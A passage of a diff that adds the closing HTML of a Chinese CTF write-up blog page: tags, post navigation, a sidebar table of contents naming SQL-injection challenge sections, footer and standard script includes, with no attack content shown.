+本文首发于<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a> 博客（ <a href="http://whc.dropsec.xyz" style="color:#258FC6">http://whc.dropsec.xyz</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+
+  
+</div>
+	
+	
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/Writeup/" rel="tag"><i class="fa fa-tag"></i> Writeup</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/16/SQL报错注入总结/" rel="next" title="SQL报错注入总结">
+                <i class="fa fa-chevron-left"></i> SQL报错注入总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/08/绕过7个字符getshell/" rel="prev" title="绕过7个字符getshell">
+                绕过7个字符getshell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://i2.muimg.com/567571/93e407bf4ec3ebb7.jpg"
+               alt="Ha1g0" />
+          <p class="site-author-name" itemprop="name">Ha1g0</p>
+           
+              <p class="site-description motion-element" itemprop="description">最近博客重新搭建了，顺便清空了一些以前看起来有些zz的文章</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/whcjst" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xq.dropsec.xyz/" title="Mr_white" target="_blank">Mr_white</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yaocl.cn/" title="Mr_Yao" target="_blank">Mr_Yao</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://w3dr.github.io/" title="w3dr" target="_blank">w3dr</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#00x1-到底是不是number呢？"><span class="nav-number">1.</span> <span class="nav-text">00x1 到底是不是number呢？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x2-登陆一下好吗？"><span class="nav-number">2.</span> <span class="nav-text">00x2 登陆一下好吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x3-因垂丝汀的绕过"><span class="nav-number">3.</span> <span class="nav-text">00x3 因垂丝汀的绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x4-简单的sql注入"><span class="nav-number">4.</span> <span class="nav-text">00x4 简单的sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x5-简单的sql注入2"><span class="nav-number">5.</span> <span class="nav-text">00x5 简单的sql注入2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x6-简单的sql注入3"><span class="nav-number">6.</span> <span class="nav-text">00x6 简单的sql注入3</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ha1g0</span>
+</div>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+</body>
+</html>
